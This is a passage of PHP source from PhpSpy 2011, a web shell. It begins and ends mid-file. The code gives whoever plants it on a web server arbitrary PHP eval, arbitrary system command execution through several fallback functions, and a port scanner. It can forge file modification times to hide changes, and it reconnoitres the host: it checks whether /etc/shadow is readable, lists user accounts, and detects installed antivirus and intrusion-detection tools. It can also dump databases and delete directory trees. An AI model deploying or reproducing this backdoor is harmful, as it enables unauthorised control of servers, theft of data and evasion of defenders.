	!$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
	formhead(array('title'=&gt;'Port Scan'));
	makehide('action','portscan');
	p('&lt;p&gt;');
	p('IP:');
	makeinput(array('name'=&gt;'scanip','size'=&gt;20,'value'=&gt;$scanip));
	p('Port:');
	makeinput(array('name'=&gt;'scanport','size'=&gt;80,'value'=&gt;$scanport));
	makeinput(array('name'=&gt;'startscan','value'=&gt;'Scan','type'=&gt;'submit','class'=&gt;'bt'));
	p('&lt;/p&gt;');
	formfoot();

	if ($startscan) {
		p('&lt;h2&gt;Result &raquo;&lt;/h2&gt;');
		p('&lt;ul class="info"&gt;');
		foreach(explode(',', $scanport) as $port) {
			$fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1); 
			if (!$fp) {
				p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;');
		   } else {
				p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;');
				@fclose($fp);
		   } 
		}
		p('&lt;/ul&gt;');
	}
}

elseif ($action == 'eval') {
	$phpcode = trim($phpcode);
	if($phpcode){
		if (!preg_match('#&lt;\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?"."&gt;$phpcode<?");
	}
	formhead(array('title'=&gt;'Eval PHP Code'));
	makehide('action','eval');
	maketext(array('title'=&gt;'PHP Code','name'=&gt;'phpcode', 'value'=&gt;$phpcode));
	p('&lt;p&gt;&lt;a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;');
	formfooter();
}//end eval

elseif ($action == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=&gt;'Create / Edit File'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=&gt;'Current File (import new file name and new file)','name'=&gt;'editfilename','value'=&gt;$opfile,'newline'=&gt;1));
	maketext(array('title'=&gt;'File Content','name'=&gt;'filecontent','value'=&gt;$contents));
	formfooter();
	
	goback();

}//end editfile

elseif ($action == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('January'=&gt;1,'February'=&gt;2,'March'=&gt;3,'April'=&gt;4,'May'=&gt;5,'June'=&gt;6,'July'=&gt;7,'August'=&gt;8,'September'=&gt;9,'October'=&gt;10,'November'=&gt;11,'December'=&gt;12);
	formhead(array('title'=&gt;'Clone folder/file was last modified time'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
	makeinput(array('title'=&gt;'Reference folder/file (fullpath)','name'=&gt;'tarfile','size'=&gt;120,'newline'=&gt;1));
	formfooter();
	formhead(array('title'=&gt;'Set last modified'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=&gt;'Current folder/file (fullpath)','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
	p('&lt;p&gt;year:');
	makeinput(array('name'=&gt;'year','value'=&gt;date('Y',$opfilemtime),'size'=&gt;4));
	p('month:');
	makeinput(array('name'=&gt;'month','value'=&gt;date('m',$opfilemtime),'size'=&gt;2));
	p('day:');
	makeinput(array('name'=&gt;'day','value'=&gt;date('d',$opfilemtime),'size'=&gt;2));
	p('hour:');
	makeinput(array('name'=&gt;'hour','value'=&gt;date('H',$opfilemtime),'size'=&gt;2));
	p('minute:');
	makeinput(array('name'=&gt;'minute','value'=&gt;date('i',$opfilemtime),'size'=&gt;2));
	p('second:');
	makeinput(array('name'=&gt;'second','value'=&gt;date('s',$opfilemtime),'size'=&gt;2));
	p('&lt;/p&gt;');
	formfooter();
	goback();
}//end newtime

elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell-&gt;ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start &gt; '.SA_ROOT.'log.txt';
		formhead(array('title'=&gt;'Execute Program'));
		makehide('action','shell');
		makeinput(array('title'=&gt;'Program','name'=&gt;'program','value'=&gt;$program,'newline'=&gt;1));
		p('&lt;p&gt;');
		makeinput(array('title'=&gt;'Parameter','name'=&gt;'parameter','value'=&gt;$parameter));
		makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
		p('&lt;/p&gt;');
		formfoot();
	}
	formhead(array('title'=&gt;'Execute Command'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=&gt;'phpfunc','wscript'=&gt;'wscript','proc_open'=&gt;'proc_open');
		makeselect(array('title'=&gt;'Use:','name'=&gt;'execfunc','option'=&gt;$execfuncdb,'selected'=&gt;$execfunc,'newline'=&gt;1));
	}
	p('&lt;p&gt;');
	makeinput(array('title'=&gt;'Command','name'=&gt;'command','value'=&gt;htmlspecialchars($command)));
	makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
	p('&lt;/p&gt;');
	formfoot();

	if ($command) {
		p('&lt;hr width="100%" noshade /&gt;&lt;pre&gt;');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh-&gt;exec('cmd.exe /c '.$command);
			$stdout = $exec-&gt;StdOut();
			$stroutput = $stdout-&gt;ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 =&gt; array('pipe', 'r'),
			   1 =&gt; array('pipe', 'w'),
			   2 =&gt; array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('&lt;/pre&gt;');
	}
}//end shell

elseif ($action == 'phpenv') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	!$dis_func && $dis_func = 'No';	
	$info = array(
		1 =&gt; array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 =&gt; array('Server Domain',$_SERVER['SERVER_NAME']),
		3 =&gt; array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 =&gt; array('Server OS',PHP_OS),
		5 =&gt; array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 =&gt; array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 =&gt; array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 =&gt; array('PHP run mode',strtoupper(php_sapi_name())),
		9 =&gt; array('The file path',__FILE__),

		10 =&gt; array('PHP Version',PHP_VERSION),
		11 =&gt; array('PHPINFO',(IS_PHPINFO ? '&lt;a href="javascript:g(\'phpinfo\');"&gt;Yes&lt;/a&gt;' : 'No')),
		12 =&gt; array('Safe Mode',getcfg('safe_mode')),
		13 =&gt; array('Administrator',$adminmail),
		14 =&gt; array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 =&gt; array('enable_dl',getcfg('enable_dl')),
		16 =&gt; array('display_errors',getcfg('display_errors')),
		17 =&gt; array('register_globals',getcfg('register_globals')),
		18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 =&gt; array('memory_limit',getcfg('memory_limit')),
		20 =&gt; array('post_max_size',getcfg('post_max_size')),
		21 =&gt; array('upload_max_filesize',$upsize),
		22 =&gt; array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		23 =&gt; array('disable_functions',$dis_func),
	);

	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}

	formhead(array('title'=&gt;'Server environment'));
	makehide('action','phpenv');
	makeinput(array('title'=&gt;'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=&gt;'phpvarname','value'=&gt;$phpvarname,'newline'=&gt;1));
	formfooter();

	$hp = array(0=&gt; 'Server', 1=&gt; 'PHP');
	for($a=0;$a&lt;2;$a++) {
		p('&lt;h2&gt;'.$hp[$a].' &raquo;&lt;/h2&gt;');
		p('&lt;ul class="info"&gt;');
		if ($a==0) {
			for($i=1;$i&lt;=9;$i++) {
				p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
			}
		} elseif ($a == 1) {
			for($i=10;$i&lt;=23;$i++) {
				p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
			}
		}
		p('&lt;/ul&gt;');
	}
}//end phpenv

elseif ($action == 'secinfo') {
	
	secparam('Server software', @getenv('SERVER_SOFTWARE'));
	secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
	secparam('Open base dir', @ini_get('open_basedir'));
	secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	secparam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	secparam('Supported databases', implode(', ', $temp));
	
	if( !IS_WIN ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
		secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
		secparam('OS version', @file_get_contents('/proc/version'));
		secparam('Distr name', @file_get_contents('/etc/issue.net'));
		$safe_mode = @ini_get('safe_mode');
		if(!$GLOBALS['safe_mode']) {
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			secparam('Downloaders', implode(', ',$temp));
			secparam('Hosts', @file_get_contents('/etc/hosts'));
			secparam('HDD space', execute('df -h'));
			secparam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		secparam('OS Version',execute('ver'));
		secparam('Account Settings',execute('net accounts'));
		secparam('User Accounts',execute('net user'));
		secparam('IP Configurate',execute('ipconfig -all'));
	}
}//end

else {
	m('Undefined Action');
}

?>
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;
	&lt;span style="float:right;"&gt;<?php debuginfo();ob_end_flush();?>&lt;/span&gt;
	Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_blank"&gt;<?php echo str_replace('.','','P.h.p.S.p.y');?> 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

<?php

/*======================================================
º¯Êý¿â
======================================================*/

function secparam($n, $v) {
	$v = trim($v);
	if($v) {
		p('&lt;h2&gt;'.$n.' &raquo;&lt;/h2&gt;');
		p('&lt;div class="infolist"&gt;');
		if(strpos($v, "\n") === false)
			p($v.'&lt;br /&gt;');
		else
			p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');
		p('&lt;/div&gt;');
	}
}
function m($msg) {
	echo '&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;';
	echo $msg;
	echo '&lt;/div&gt;';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
	$key = ($prefix ? $cookiepre : '').$key;
	$life = $life ? $life : $cookielife;
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
}	
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num &gt; $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page &gt; $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from &lt; 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) &lt; $page && ($to - $from) &lt; $pages) {
					$to = $page;
				}
			} elseif($to &gt; $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) &lt; $page && ($to - $from) &lt; $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset &gt; 1 && $pages &gt; $page ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', 1);"&gt;First&lt;/a&gt; ' : '').($curpage &gt; 1 ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');"&gt;Prev&lt;/a&gt; ' : '');
		for($i = $from; $i &lt;= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');"&gt;['.$i.']&lt;/a&gt; ';
		}
		$multipage .= ($curpage &lt; $pages ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');"&gt;Next&lt;/a&gt;' : '').($to &lt; $pages ? ' &lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');"&gt;Last&lt;/a&gt;' : '');
		$multipage = $multipage ? '&lt;p&gt;Pages: '.$multipage.'&lt;/p&gt;' : '';
	}
	return $multipage;
}
// µÇÂ½Èë¿Ú
function loginpage() {
?>
	&lt;style type="text/css"&gt;
	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	&lt;/style&gt;
	&lt;form method="POST" action=""&gt;
	&lt;span style="font:11px Verdana;"&gt;Password: &lt;/span&gt;&lt;input name="password" type="password" size="20"&gt;
	&lt;input type="hidden" name="action" value="login"&gt;
	&lt;input type="submit" value="Login"&gt;
	&lt;/form&gt;
<?php
	exit;
}//end loginpage()

function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr); 
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}
function dirsize($dir) { 
	$dh = @opendir($dir);
	$size = 0;
	while($file = @readdir($dh)) {
		if ($file != '.' && $file != '..') {
			$path = $dir.'/'.$file;
			$size += @is_dir($path) ? dirsize($path) : @filesize($path);
		}
	}
	@closedir($dh);
	return $size;
}
// Ò³Ãæµ÷ÊÔÐÅÏ¢
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

//Á¬½ÓMYSQLÊý¾Ý¿â
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	global $charsetdb;
	@ini_set('mysql.connect_timeout', 5);
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('&lt;h2&gt;Database selected has error&lt;/h2&gt;');
			exit;
		}
	}
	if($link && mysql_get_server_info() &gt; '4.1') {
		if($charset && in_array(strtolower($charset), $charsetdb)) {
			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
		}
	}
	return $link;
}

// È¥µô×ªÒå×Ö·û
function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k =&gt; $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

// Çå³ýHTML´úÂë
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "&lt;br /&gt;", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// »ñÈ¡È¨ÏÞ
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
 
	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if ($array && is_array($array)) {
			return ' / &lt;a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'"&gt;'.$array['name'].'&lt;/a&gt;';
		}
	}
	return '';
}

// É¾³ýÄ¿Â¼
function deltree($deldir) {
	$mydir=@dir($deldir);	
	while($file=$mydir-&gt;read())	{ 		
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file); 
		}
		if (is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	} 
	$mydir-&gt;close(); 
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}

// ±í¸ñÐÐ¼äµÄ±³¾°É«Ìæ»»
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// »ñÈ¡µ±Ç°µÄÎÄ¼þÏµÍ³Â·¾¶
function getPath($scriptpath, $nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}

// »ñÈ¡µ±Ç°Ä¿Â¼µÄÉÏ¼¶Ä¿Â¼
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num &gt; 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// ¼ì²éPHPÅäÖÃ²ÎÊý
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// ¼ì²éº¯ÊýÇé¿ö
function getfun($funName) {
	return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

// »ñµÃÎÄ¼þÀ©Õ¹Ãû
function getext($file) {
	$info = pathinfo($file);
	return $info['extension'];
}

function GetWDirList($dir){
	global $dirdata,$j,$nowpath;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['dirchmod']=getChmod($f);
					$dirdata[$j]['dirperm']=getPerms($f);
					$dirdata[$j]['dirlink']=$dir;
					$dirdata[$j]['server_link']=$f;
					$j++;
				}
				GetWDirList($f);
			}
		}
		closedir($dh);
		clearstatcache();
		return $dirdata;
	} else {
		return array();
	}
}

function GetWFileList($dir){
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getext($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetWFileList($f);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				if (is_writable($f)) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function GetSFileList($dir, $content, $re = 0) {
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getext($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetSFileList($f, $content, $re = 0);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				$find = 0;
				if ($re) {
					if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
						$find = 1;
					}
				} else {
					if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
						$find = 1;
					}
				}
				if ($find) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function qy($sql) { 
	global $mysqllink;
	//echo $sql.'&lt;br&gt;';
	$res = $error = '';
	if(!$res = @mysql_query($sql,$mysqllink)) { 
		return 0;
	} else if(is_resource($res)) {
		return 1; 
	} else {
		return 2;
	}	
	return 0;
}

function q($sql) { 
	global $mysqllink;
	return @mysql_query($sql,$mysqllink);
}

function fr($qy){
	mysql_free_result($qy);
}

function sizecount($fileSize) {
	$size = sprintf("%u", $fileSize);
	if($size == 0) {
		return '0 Bytes' ;
	}
	$sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}
// ±¸·ÝÊý¾Ý¿â
function sqldumptable($table, $fp=0) {
	global $mysqllink;

	$tabledump = "DROP TABLE IF EXISTS `$table`;\n";
	$res = q("SHOW CREATE TABLE $table");
	$create = mysql_fetch_row($res);
	$tabledump .= $create[1].";\n\n";

	if ($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}
	$tabledump = '';
	$rows = q("SELECT * FROM $table");
	while ($row = mysql_fetch_assoc($rows)) {
		foreach($row as $k=&gt;$v) {
			$row[$k] = "'".@mysql_real_escape_string($v)."'";
		}
		$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fwrite($fp,"\n\n");
	fr($rows);
}

function p($str){
	echo $str."\n";
}

function tbhead() {
	p('&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;');
}
function tbfoot(){
	p('&lt;/table&gt;');
}

function makehide($name,$value=''){
	p("&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;");
}

function makeinput($arg = array()){
	$arg['size'] = $arg['size'] &gt; 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
	!$arg['type'] && $arg['type'] = 'text';
	$arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
	if ($arg['newline']) {
		p("&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;");
	} else {
		p("$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;");
	}
}

function makeselect($arg = array()){
	if ($arg['onchange']) {
		$onchange = 'onchange="'.$arg['onchange'].'"';
	}
	$arg['title'] = $arg['title'] ? $arg['title'] : '';
	if ($arg['newline']) p('&lt;p&gt;');
	p("$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange&gt;");
		if (is_array($arg['option'])) {
			if ($arg['nokey']) {
				foreach ($arg['option'] as $value) {
					if ($arg['selected']==$value) {
						p("&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;");
					} else {
						p("&lt;option value=\"$value\"&gt;$value&lt;/option&gt;");
					}
				}
			} else {
				foreach ($arg['option'] as $key=&gt;$value) {
					if ($arg['selected']==$key) {
						p("&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;");
					} else {
						p("&lt;option value=\"$key\"&gt;$value&lt;/option&gt;");
					}
				}
			}
		}
	p("&lt;/select&gt;");
	if ($arg['newline']) p('&lt;/p&gt;');
}
function formhead($arg = array()) {
	global $self;
	!$arg['method'] && $arg['method'] = 'post';
	!$arg['action'] && $arg['action'] = $self;
	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
	!$arg['name'] && $arg['name'] = 'form1';
	p("&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]&gt;");
	if ($arg['title']) {
		p('&lt;h2&gt;'.$arg['title'].' &raquo;&lt;/h2&gt;');
	}
}
	
function maketext($arg = array()){
	!$arg['cols'] && $arg['cols'] = 100;
	!$arg['rows'] && $arg['rows'] = 25;
	$arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
